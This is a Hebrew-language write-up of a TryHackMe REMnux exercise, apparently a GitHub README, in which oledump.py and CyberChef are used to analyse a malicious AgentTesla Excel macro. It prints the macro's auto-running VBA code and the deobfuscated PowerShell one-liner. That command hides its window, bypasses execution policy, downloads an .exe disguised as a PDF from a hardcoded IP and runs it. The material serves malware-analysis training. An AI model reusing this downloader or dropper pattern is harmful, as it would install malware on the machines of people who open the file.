# THM---REMnux-Getting-Started
<img width="1163" height="406" alt="image" src="https://github.com/user-attachments/assets/76b03520-a010-4e36-ab6a-9056ea046c87" />




ראשי התיבות הם: Reverse-Engineering Malware Linux.
זוהי הפצה של לינוקס (מבוססת אובונטו) שמיודעת כולה למטרה אחת: ניתוח ותחקור של תוכנות זדוניות. היא מגיעה עם מאות כלים מותקנים מראש לביצוע ניתוח סטטי, ניתוח דינמי, הנדסה לאחור של קבצי PDF, JavaScript, קבצי Office ועוד.




הנה תרגום המשימה לעברית, מותאם למונחים המקצועיים בעולם אבטחת המידע:

---

## ניתוח מסמך זדוני באמצעות oledump.py

במשימה זו נשתמש בכלי **oledump.py** כדי לבצע ניתוח סטטי על מסמך Excel שחשוד כזדוני.

**Oledump.py** הוא כלי מבוסס Python המנתח קובצי OLE2 (המכונים לעיתים Structured Storage או Compound File Binary Format). ראשי התיבות OLE מייצגים את הטכנולוגיה **Object Linking and Embedding** של מיקרוסופט. קובצי OLE2 משמשים בדרך כלל לאחסון סוגי נתונים מרובים, כגון מסמכים, גיליונות אלקטרוניים ומצגות, בתוך קובץ יחיד. כלי זה שימושי מאוד לחילוץ ובחינת התוכן של קובצי OLE2, מה שהופך אותו למשאב בעל ערך עבור ניתוח פורנזי וזיהוי נוזקות.

### בואו נתחיל!

תוך שימוש במכונה הווירטואלית REMnux (המצורפת למשימה 2), עברו לנתיב:
`/home/ubuntu/Desktop/tasks/agenttesla/`.
קובץ היעד שלנו נקרא **agenttesla.xlsm**. הריצו את הפקודה: `oledump.py agenttesla.xlsm`.

**הפלט בטרמינל:**

```bash
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'

```

בהתבסס על ניתוח הקובץ, נראה כי תסריט (Script) של VBA מוטמע במסמך ונמצא בתוך `xl/vbaProject.bin`. הכלי מקצה לזה את האינדקס **A** (זה עשוי להשתנות לפעמים). השילוב של האינדקס (A) ומספרים נקרא **זרמי נתונים (Data Streams)**.

שימו לב לזרם הנתונים עם האות **M** הגדולה (A4). האות M מסמלת שיש שם **Macro** (מאקרו), וכדאי לבדוק את הזרם הזה: `'VBA/ThisWorkbook'`.

### בחינת זרם הנתונים

הריצו את הפקודה: `oledump.py agenttesla.xlsm -s 4`.
הפרמטר `-s` הוא קיצור של `select` (בחירה), והמספר 4 נבחר כי זרם הנתונים שמעניין אותנו נמצא במקום הרביעי (A4).

התוצאות יופיעו בפורמט **Hex Dump** (תצוגה הקסדצימלית). לעין לא מאומנת זה עשוי להיראות כמו ג'יבריש ומאתגר להבנה. לכן, נהפוך את זה לקריא יותר.

נריץ את הפקודה עם פרמטר נוסף: `--vbadecompress`. פרמטר זה יגרום ל-oledump לפרוס אוטומטית את המאקרו המכווץ לפורמט קריא.

**הפקודה:**
`oledump.py agenttesla.xlsm -s 4 --vbadecompress`

**התוצאה (חלקי):**

```vba
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)

```

זה הרבה יותר טוב! אנחנו לא צריכים לקרוא את כל הסקריפט, אלא להכיר כמה פקודות מפתח. הערך של המשתנה `Sqtnew` מעניין אותנו במיוחד כי הוא מכיל כתובת IP ציבורית, קובץ PDF וקובץ `.exe`.

### שימוש ב-CyberChef לפיענוח

נעתיק את הערך הראשון של `Sqtnew` ונדביק אותו ב-**CyberChef**.
בסקריפט ראינו פקודות שמחליפות את התווים `*` ו-`^` בערך ריק (כלומר, מוחקות אותם). לכן ב-CyberChef נשתמש בפעולת **Find/Replace** פעמיים:

1. פעם אחת למחיקת `*`.
2. פעם שנייה למחיקת `^`.

**התוצאה תהיה פקודת PowerShell קריאה:**
`"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"`

### ניתוח הפקודה:

* **WindowStyle hidden**: חלון ה-PowerShell לא יהיה גלוי למשתמש.
* **executionpolicy bypass**: עקיפת הגדרות האבטחה של PowerShell כדי לאפשר לסקריפט לרוץ ללא הגבלה.
* **Invoke-WebRequest**: משמש להורדת קבצים מהאינטרנט. כאן הוא מוריד את הקובץ `Doc-3737122pdf.exe` מהכתובת `http://193.203.203.67/rt/`.
* **OutFile**: שומר את הקובץ שהורד כקובץ זמני (`$TempFile`).
* **Start-Process**: מריץ את הקובץ שהורד.

**לסיכום:** ברגע שמסמך ה-Excel נפתח, המאקרו רץ אוטומטית! הוא מפעיל PowerShell שמוריד קובץ זדוני (למרות ששמו נראה כמו PDF, הוא קובץ הרצה EXE), שומר אותו ומריץ אותו. זוהי טכניקה נפוצה של תוקפים כדי להתחמק מזיהוי מוקדם.

כל הכבוד על פיצוח המשימה!
